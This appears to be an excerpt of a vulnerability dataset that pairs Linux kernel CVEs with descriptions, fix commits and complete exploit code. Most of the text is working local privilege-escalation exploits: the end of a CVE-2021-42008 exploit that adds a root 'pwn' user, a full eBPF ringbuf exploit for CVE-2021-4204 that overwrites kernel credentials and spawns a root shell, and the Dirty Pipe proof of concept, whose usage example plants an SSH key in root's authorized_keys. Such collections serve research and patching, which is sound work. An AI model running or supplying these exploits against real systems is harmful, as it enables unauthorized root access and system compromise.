    system(""/tmp/asd 2>/dev/null"");

    if (!getpwnam(""pwn""))
    {
        puts(""[X] Exploit failed, try again..."");
        goto end;
    }

    puts(""[+] We are root!"");
    system(""rm /tmp/asd && rm /tmp/x"");
    system(""su pwn"");

    end:

        puts(""[*] Cleaning up..."");

        for (int i = 0; i < N_MSG; i++)
        {
            if (modprobe_path && (i == valid_qid))
                continue;

            close_queue(qid_A[i]);
        }

        for (int i = 0; i < 100; i++)
            destroy_shm(i);

        return 0;
}

",https://github.com/0xdevil/CVE-2021-42008/tree/main,,,
CVE-2021-4204,https://www.opencve.io/cve/CVE-2021-4204,An out-of-bounds (OOB) memory access flaw was found in the Linux kernel's eBPF due to an Improper Input Validation. This flaw allows a local attacker with a special privilege to crash the system or leak internal information.,,,"#include <signal.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#include ""bpf.h""
#include ""config.h""
#include ""debug.h""
#include ""helper.h""

typedef struct {
    u32 rand;

    int comm_fd;
    int array_fd;
    int ringbuf_fd;
    int ringbuf_next_fd;

    int ringbuf_fds[MAP_NUM];
    pid_t processes[PROC_NUM];

    kaddr_t ringbuf;
    kaddr_t ringbuf_pages;
    kaddr_t array_map;
    kaddr_t array_map_ops;
    kaddr_t task_struct;
    kaddr_t cred;

    union {
        u8 bytes[PAGE_SIZE*8];
        u16 words[0];
        u32 dwords[0];
        u64 qwords[0];
        kaddr_t ptrs[0];
    };
} context_t;

typedef struct {
    const char* name;
    int (*func)(context_t *ctx);
    int ignore_error;
} phase_t;

int create_bpf_maps(context_t *ctx)
{
    int ret = 0;

    ret = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(u32), PAGE_SIZE, 1);
    if (ret < 0) {
        WARNF(""Failed to create comm map: %d (%s)"", ret, strerror(-ret));
        return ret;
    }
    ctx->comm_fd = ret;

    for (int i = 0; i < MAP_NUM; i++)
    {
        if ((ret = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, PAGE_SIZE)) < 0) {
            WARNF(""Could not create ringbuf map[%d]: %d (%s)"", i, ret, strerror(-ret));
            return ret;
        }
        ctx->ringbuf_fds[i] = ret;
    }

    ctx->rand = urandom();

    u32 idx = (ctx->rand%(MAP_NUM - 1));
    ctx->ringbuf_fd = ctx->ringbuf_fds[idx];
    ctx->ringbuf_next_fd = ctx->ringbuf_fds[idx+1];

    DEBUGF(""random = 0x%08x, idx = %d"", ctx->rand, idx);

    return 0;
}

int spawn_processes(context_t *ctx)
{
    for (int i = 0; i < PROC_NUM; i++)
    {
        pid_t child = fork();
        if (child == 0) {
            if (prctl(PR_SET_NAME, __ID__, 0, 0, 0) != 0) {
                WARNF(""Could not set name"");
            }
            uid_t old = getuid();
            kill(getpid(), SIGSTOP);
            uid_t uid = getuid();
            if (uid == 0 && old != uid) {
                OKF(""Enjoy root!"");
                system(""/bin/sh"");
            }
            exit(uid);
        }
        if (child < 0) {
            return child;
        }
        ctx->processes[i] = child;
    }

    return 0;
}

int corrupt_ringbuf(context_t *ctx)
{
    struct bpf_insn insn[] = {
        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r9 = r0
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, 0xff0, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0xff0),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        // if (r0 == NULL) exit(2)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // === Overwrite ringbuf's mask to 0x80000fff ===
        // r0 = BPF_FUNC_ringbuf_submit(r0-(0x3008-0x38), BPF_RB_NO_WAKEUP)
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_0, (0x3008-0x38)),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, 0x4000-8, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0x4000-8),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        // if (r0 == NULL) exit(3)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 3),
        BPF_EXIT_INSN(),

        // r6 = (struct ringbuf*)next
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x2000),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0x30),

        // if ((struct ringbuf*)(next)->mask != 0xfff) exit(4);
        BPF_MOV64_IMM(BPF_REG_8, 0xfff),
        BPF_JMP_REG(BPF_JEQ, BPF_REG_7, BPF_REG_8, 6),
        // cleanup on error
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 0x2000),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 4),
        BPF_EXIT_INSN(),

        // We are lucky, do some leak and overwrite next->mask
        BPF_ST_MEM(BPF_W, BPF_REG_6, 0x30, 0xFFFFFFFE),
        BPF_ST_MEM(BPF_W, BPF_REG_6, 0x34, 0xFFFFFFFF),

        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6, 0x8), // ringbuf addr
        BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, 8),
        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6, 0x38), // ringbuf pages
        BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, 16),
        BPF_ST_MEM(BPF_DW, BPF_REG_9, 0x0, 0x13371337),

        // Clean up

        // r0 = bpf_ringbuf_discard(r6-0x2000, BPF_RB_NO_WAKEUP)
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 0x2000),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    int prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insn, sizeof(insn) / sizeof(insn[0]), """");
    if (prog < 0) {
        WARNF(""Could not load program(corrupt_ringbuf):\n %s"", bpf_log_buf);
        goto abort;
    }

    int err = bpf_prog_skb_run(prog, ""TRIGGER"", 8);
    if (err != 0) {
        WARNF(""Could not run program(corrupt_ringbuf): %d (%s)"", err, strerror(err));
        goto abort;
    }

    int key = 0;
    err = bpf_lookup_elem(ctx->comm_fd, &key, ctx->bytes);
    if (err != 0) {
        WARNF(""Could not lookup comm map: %d (%s)"", err, strerror(err));
        goto abort;
    }

    if (ctx->qwords[0] != 0x13371337) {
        WARNF(""Could not leak kernel address. Try again if the kernel is vulnerable"");
        goto abort;
    }

    ctx->ringbuf = ctx->ptrs[1] - 8;
    ctx->ringbuf_pages = ctx->ptrs[2];

    DEBUGF(""ringbuf @ %p"", ctx->ringbuf);
    DEBUGF(""ringbuf pages @ %p"", ctx->ringbuf_pages);

    return 0;

abort:
    if (prog > 0) close(prog);
    return -1;
}

// restricted_rw read(mode >= 0) or write(mode < 0) data with consequences (*kaddr = 0, *(kaddr-8) = bad_value).
int restricted_rw(context_t *ctx, kaddr_t kaddr, void* buf, u8 bpf_size, size_t count, int mode)
{
    int size = 0;
    switch (bpf_size)
    {
    case BPF_DW:
        size = 8;
        break;
    case BPF_W:
        size = 4;
        break;
    case BPF_H:
        size = 2;
        break;
    case BPF_B:
        size = 1;
        break;
    default:
        return -1;
    }

    int ret = -1;

    u64 delta = ctx->ringbuf_pages + 0x30 - (ctx->ringbuf + 0x3000 + 8);
    u64 offset = kaddr - (ctx->ringbuf_pages + 0x30);
    u64 tmp[PAGE_SIZE] = {};

    // DEBUGF(""restricted_rw %s %p by %p + %p (delta %p)"", mode>=0 ? ""read"":""write"", (void*)kaddr, (void*)ctx->ringbuf_pages + 0x30, (void*)offset, (void*)delta);

    struct bpf_insn prefix[] = {
        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r9 = r0
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, 0x5000-8, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0x5000-8),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        // if (r0 == NULL) exit(2)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // r8 = delta
        BPF_MOV32_IMM(BPF_REG_8, (u32)(delta>>32)),
        BPF_MOV32_IMM(BPF_REG_2, (u32)(delta&0xFFFFFFFF)),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 32),
        BPF_ALU64_REG(BPF_OR, BPF_REG_8, BPF_REG_2),

        // next->producer_pos = delta
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0x4000),

        // r0 = bpf_ringbuf_discard(r0, BPF_RB_NO_WAKEUP)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_next_fd, offset+PAGE_SIZE, 0) # point to ctx->ringbuf_pages + 0x30
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_next_fd),
        BPF_MOV64_IMM(BPF_REG_2, offset+PAGE_SIZE),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        // if (r0 == NULL) exit(3)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 3),
        BPF_EXIT_INSN(),

        // *r0 = 0x80000000
        BPF_MOV64_IMM(BPF_REG_1, 1),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 31),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0),

        // r0 += offset
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, (u32)(offset)),
    };

    struct bpf_insn suffix[] = {
        // r0 point to kaddr, we need to fix that before submit
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_0, (u32)(offset)),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 8),
        // r0 = bpf_ringbuf_submit(r0, BPF_RB_NO_WAKEUP)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_submit),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prefix_cnt = sizeof(prefix)/sizeof(prefix[0]);
    int suffix_cnt = sizeof(suffix)/sizeof(suffix[0]);

    struct bpf_insn* insn = calloc(sizeof(struct bpf_insn), prefix_cnt + suffix_cnt + count*2);
    if (!insn) {
        WARNF(""Failed to allocate insn buffer: out of memory"");
        return -1;
    }

    struct bpf_insn* p = insn;

    memcpy(p, prefix, sizeof(prefix));

    p += prefix_cnt;
    
    u8 src = mode >= 0? BPF_REG_0 : BPF_REG_9;
    u8 dst = mode >= 0? BPF_REG_9 : BPF_REG_0;
    for (int i = 0; i < count; i++) {
        *p++ = BPF_LDX_MEM(bpf_size, BPF_REG_1, src, i*size);
        *p++ = BPF_STX_MEM(bpf_size, dst, BPF_REG_1, i*size);
    }

    memcpy(p, suffix, sizeof(suffix));

    int prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insn, prefix_cnt + suffix_cnt + count*2, """");
    if (prog < 0) {
        WARNF(""Failed to load program(read):\n %s"", bpf_log_buf);
        goto abort;
    }

    int err = 0;

    if (mode < 0) {
        memcpy(tmp, buf, size*count);
        err = bpf_update_elem(ctx->comm_fd, &err, tmp, 0);
        if (err != 0) {
            WARNF(""Failed to update comm map: %d (%s)"", err, strerror(err));
            goto abort;
        }
    }

    if ((err = bpf_prog_skb_run(prog, ""tr3e of SecCoder Security Lab"", 30)) != 0) {
        WARNF(""Failed to run program(read): %d (%s)"", err, strerror(err));
        goto abort;
    }

    if (mode > 0) {
        err = bpf_lookup_elem(ctx->comm_fd, &err, tmp);
        if (err != 0) {
            WARNF(""Failed to lookup comm map: %d (%s)"", err, strerror(err));
            goto abort;
        }
        memcpy(buf, tmp, size*count);
    }

    ret = 0;

abort:
    if (prog > 0) close(prog);
    return ret;
}

int find_cred(context_t *ctx)
{
    kaddr_t kaddr = ctx->ringbuf_pages + 0x30;
    
    for (int i = 0; i < 2*PAGE_SIZE; i++)
    {
        if (restricted_rw(ctx, kaddr, ctx->bytes, BPF_DW, PAGE_SIZE/8, 1) != 0) {
            WARNF(""Could not find task_struct from kernel vmalloc memory"");
            goto abort;
        }
        u8 *tmp = ctx->bytes;
        size_t size = PAGE_SIZE;
        while(true) {
            int offset = memoff(tmp, size, __ID__, sizeof(__ID__));
            if (offset < 0) break;
            kaddr_t creds[2] = {};
            kaddr_t cred_from_task = kaddr + offset - 0x10;
            if (restricted_rw(ctx, cred_from_task, creds, BPF_DW, 2, 1) != 0) {
                WARNF(""Could not read kernel address %p"", cred_from_task);
                break;
            }
            // could be cred or cached_requested_key
            kaddr_t cred = creds[1] != NULL ? creds[1] : creds[0];
            DEBUGF(""Found an candidate task %p, cred %p"", cred_from_task, cred);
            if (cred != 0 && cred > ctx->ringbuf_pages && cred < ctx->ringbuf_pages + (1<<29)) {
                ctx->cred = cred;
                DEBUGF(""task struct ~ %p"", cred_from_task);
                DEBUGF(""cred @ %p"", ctx->cred);
                return 0;
            }
            tmp += offset + sizeof(__ID__);
            size -= offset + sizeof(__ID__);
        }
        kaddr += PAGE_SIZE;
    }

abort:
    return -1;
}

int overwrite_cred(context_t *ctx)
{
    u64 zero = 0;
    if (restricted_rw(ctx, ctx->cred + OFFSET_uid_from_cred, &zero, BPF_W, 1, -1) != 0) {
        return -1;
    }
    if (restricted_rw(ctx, ctx->cred + OFFSET_gid_from_cred, &zero, BPF_W, 1, -1) != 0) {
        return -1;
    }
    if (restricted_rw(ctx, ctx->cred + OFFSET_euid_from_cred, &zero, BPF_W, 1, -1) != 0) {
        return -1;
    }
    if (restricted_rw(ctx, ctx->cred + OFFSET_egid_from_cred, &zero, BPF_W, 1, -1) != 0) {
        return -1;
    }

    return 0;
}

int spawn_root_shell(context_t *ctx)
{
    for (int i = 0; i < PROC_NUM; i++)
    {
        kill(ctx->processes[i], SIGCONT);
    }
    while(wait(NULL) > 0);
    return 0;
}

int clean_up(context_t *ctx)
{
    close(ctx->comm_fd);
    for (int i = 0; i < MAP_NUM; i++)
    {
        if (ctx->ringbuf_fds[i]) close(ctx->ringbuf_fds[i]);
    }
    kill(0, SIGCONT);
    return 0;
}

phase_t phases[] = {
    { .name = ""create bpf map(s)"", .func = create_bpf_maps },
    { .name = ""corrupt ringbuf"", .func = corrupt_ringbuf },
    { .name = ""spawn processes"", .func = spawn_processes },
    { .name = ""find cred (slow)"", .func = find_cred },
    { .name = ""overwrite cred"", .func = overwrite_cred },
    { .name = ""spawn root shell"", .func = spawn_root_shell },
    { .name = ""clean up the mess"", .func = clean_up , .ignore_error = 1 },
};

int main(int argc, char** argv)
{
    context_t ctx = {};
    int err = 0;
    int max = sizeof(phases) / sizeof(phases[0]);
    if (getuid() == 0) {
        BADF(""You are already root, exiting..."");
        return -1;
    }
    for (int i = 1; i <= max; i++)
    {
        phase_t *phase = &phases[i-1];
        if (err != 0 && !phase->ignore_error) {
            ACTF(""phase(%d/%d) '%s' skipped"", i, max, phase->name);
            continue;
        }
        ACTF(""phase(%d/%d) '%s' running"", i, max, phase->name);
        int error = phase->func(&ctx);
        if (error != 0) {
            BADF(""phase(%d/%d) '%s' return with error %d"", i, max, phase->name, error);
            err = error;
        } else {
            OKF(""phase(%d/%d) '%s' done"", i, max, phase->name);
        }
    }
    return err;
}

",https://github.com/tr3ee/CVE-2021-4204?tab=readme-ov-file,"但是，是否存在某个调用约定没有遵守这个规则呢？

----[ 1.2 - 漏洞分析

是的，它存在！BPF ringbuf没有遵守这一规则，这也就是CVE-2021-4204。

BPF ringbuf是一个内置的高性能环形缓冲区，用于弥补perf buffer不能满足的场景，相关的文档可以看这个
https://www.kernel.org/doc/html/latest/bpf/ringbuf.html

* C *
------------------------------------------------------------------------------------------------
BPF_CALL_2(bpf_ringbuf_submit, void *, sample, u64, flags)
{
    bpf_ringbuf_commit(sample, flags, false /* discard */);
    return 0;
}

const struct bpf_func_proto bpf_ringbuf_submit_proto = {
    .func        = bpf_ringbuf_submit,
    .ret_type    = RET_VOID,
    .arg1_type    = ARG_PTR_TO_ALLOC_MEM,
    .arg2_type    = ARG_ANYTHING,
};

BPF_CALL_2(bpf_ringbuf_discard, void *, sample, u64, flags)
{
    bpf_ringbuf_commit(sample, flags, true /* discard */);
    return 0;
}

const struct bpf_func_proto bpf_ringbuf_discard_proto = {
    .func        = bpf_ringbuf_discard,
    .ret_type    = RET_VOID,
    .arg1_type    = ARG_PTR_TO_ALLOC_MEM,
    .arg2_type    = ARG_ANYTHING,
};
------------------------------------------------------------------------------------------------

上面这段ringbuf.c的代码中，提供了两个辅助函数bpf_ringbuf_submit()和bpf_ringbuf_discard()，他们的
首个参数都是mem_ptr并且后续却没有跟着mem_size类型的参数。",https://tr3e.ee/posts/cve-2021-4204-linux-kernel-ebpf-lpe.txt,
CVE-2022-0847,https://www.opencve.io/cve/CVE-2022-0847,A flaw was found in the way the "flags" member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.,"lib/iov_iter: initialize ""flags"" in new pipe_buffer
The functions copy_page_to_iter_pipe() and push_pipe() can both
allocate a new pipe_buffer, but the ""flags"" member initializer is
missing.

Fixes: 241699cd72a8 (""new iov_iter flavour: pipe-backed"")
To: Alexander Viro <viro@zeniv.linux.org.uk>
To: linux-fsdevel@vger.kernel.org
To: linux-kernel@vger.kernel.org
Cc: stable@vger.kernel.org
Signed-off-by: Max Kellermann <max.kellermann@ionos.com>
Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>
Diffstat (limited to 'lib/iov_iter.c')
-rw-r--r--	lib/iov_iter.c	2	
1 files changed, 2 insertions, 0 deletions
diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15e..6dd5330f7a9957 100644
--- a/lib/iov_iter.c
+++ b/lib/iov_iter.c
@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
 		return 0;
 
 	buf->ops = &page_cache_pipe_buf_ops;
+	buf->flags = 0;
 	get_page(page);
 	buf->page = page;
 	buf->offset = offset;
@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
 			break;
 
 		buf->ops = &default_pipe_buf_ops;
+		buf->flags = 0;
 		buf->page = page;
 		buf->offset = 0;
 		buf->len = min_t(ssize_t, left, PAGE_SIZE);",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/lib/iov_iter.c?id=9d2231c5d74e13b2a0546fee6737ee4446017903,"/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * ""pipe_buffer.flags"" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd (""pipe: merge
 * anon_pipe_buf*_ops"").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all ""bufs"" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its ""flags"", the buffer
	   will be mergeable */
}

int main(int argc, char **argv)
{
	if (argc != 4) {
		fprintf(stderr, ""Usage: %s TARGETFILE OFFSET DATA\n"", argv[0]);
		return EXIT_FAILURE;
	}

	/* dumb command-line argument parser */
	const char *const path = argv[1];
	loff_t offset = strtoul(argv[2], NULL, 0);
	const char *const data = argv[3];
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, ""Sorry, cannot start writing at a page boundary\n"");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, ""Sorry, cannot write across a page boundary\n"");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror(""open failed"");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror(""stat failed"");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, ""Offset is not inside the file\n"");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, ""Sorry, cannot enlarge the file\n"");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   ""flags"", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror(""splice failed"");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, ""short splice\n"");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror(""write failed"");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, ""short write\n"");
		return EXIT_FAILURE;
	}

	printf(""It worked!\n"");
	return EXIT_SUCCESS;
}

",https://github.com/chenaotian/CVE-2022-0847/tree/main,,,
CVE-2022-0995,https://www.opencve.io/cve/CVE-2022-0995,"An out-of-bounds (OOB) memory write flaw was found in the Linux kernel’s watch_queue event notification subsystem. This flaw can overwrite parts of the kernel state, potentially allowing a local user to gain privileged access or cause a denial of service on the system.","Merge branch 'davidh' (fixes from David Howells)
Merge misc fixes from David Howells:
 ""A set of patches for watch_queue filter issues noted by Jann. I've
  added in a cleanup patch from Christophe Jaillet to convert to using
  formal bitmap specifiers for the note allocation bitmap.

  Also two filesystem fixes (afs and cachefiles)""

* emailed patches from David Howells <dhowells@redhat.com>:
  cachefiles: Fix volume coherency attribute
  afs: Fix potential thrashing in afs writeback
  watch_queue: Make comment about setting ->defunct more accurate
  watch_queue: Fix lack of barrier/sync/lock between post and read
  watch_queue: Free the alloc bitmap when the watch_queue is torn down
  watch_queue: Fix the alloc bitmap size to reflect notes allocated
  watch_queue: Use the bitmap API when applicable
  watch_queue: Fix to always request a pow-of-2 pipe ring size
  watch_queue: Fix to release page in ->release()
  watch_queue, pipe: Free watchqueue state after clearing pipe ring
  watch_queue: Fix filter limit check
Diffstat
-rw-r--r--	fs/afs/write.c	9	
-rw-r--r--	fs/cachefiles/xattr.c	23	
-rw-r--r--	fs/pipe.c	11	
-rw-r--r--	include/linux/watch_queue.h	3	
-rw-r--r--	include/trace/events/cachefiles.h	2	
-rw-r--r--	kernel/watch_queue.c	22	
6 files changed, 50 insertions, 20 deletions
diff --git a/fs/afs/write.c b/fs/afs/write.c
index 5e9157d0da294b..f447c902318da0 100644
--- a/fs/afs/write.c
+++ b/fs/afs/write.c
@@ -703,7 +703,7 @@ static int afs_writepages_region(struct address_space *mapping,
 	struct folio *folio;
 	struct page *head_page;
 	ssize_t ret;
-	int n;
+	int n, skips = 0;
 
 	_enter(""%llx,%llx,"", start, end);
 
@@ -754,8 +754,15 @@ static int afs_writepages_region(struct address_space *mapping,
 #ifdef CONFIG_AFS_FSCACHE
 				folio_wait_fscache(folio);
 #endif
+			} else {
+				start += folio_size(folio);
 			}
 			folio_put(folio);
+			if (wbc->sync_mode == WB_SYNC_NONE) {
+				if (skips >= 5 || need_resched())
+					break;
+				skips++;
+			}
 			continue;
 		}
 
diff --git a/fs/cachefiles/xattr.c b/fs/cachefiles/xattr.c
index 83f41bd0c3a974..35465109d9c4ea 100644
--- a/fs/cachefiles/xattr.c
+++ b/fs/cachefiles/xattr.c
@@ -28,6 +28,11 @@ struct cachefiles_xattr {
 static const char cachefiles_xattr_cache[] =
 	XATTR_USER_PREFIX ""CacheFiles.cache"";
 
+struct cachefiles_vol_xattr {
+	__be32	reserved;	/* Reserved, should be 0 */
+	__u8	data[];		/* netfs volume coherency data */
+} __packed;
+
 /*
  * set the state xattr on a cache file
  */
@@ -185,6 +190,7 @@ void cachefiles_prepare_to_write(struct fscache_cookie *cookie)
  */
 bool cachefiles_set_volume_xattr(struct cachefiles_volume *volume)
 {
+	struct cachefiles_vol_xattr *buf;
 	unsigned int len = volume->vcookie->coherency_len;
 	const void *p = volume->vcookie->coherency;
 	struct dentry *dentry = volume->dentry;
@@ -192,10 +198,17 @@ bool cachefiles_set_volume_xattr(struct cachefiles_volume *volume)
 
 	_enter(""%x,#%d"", volume->vcookie->debug_id, len);
 
+	len += sizeof(*buf);
+	buf = kmalloc(len, GFP_KERNEL);
+	if (!buf)
+		return false;
+	buf->reserved = cpu_to_be32(0);
+	memcpy(buf->data, p, len);
+
 	ret = cachefiles_inject_write_error();
 	if (ret == 0)
 		ret = vfs_setxattr(&init_user_ns, dentry, cachefiles_xattr_cache,
-				   p, len, 0);
+				   buf, len, 0);
 	if (ret < 0) {
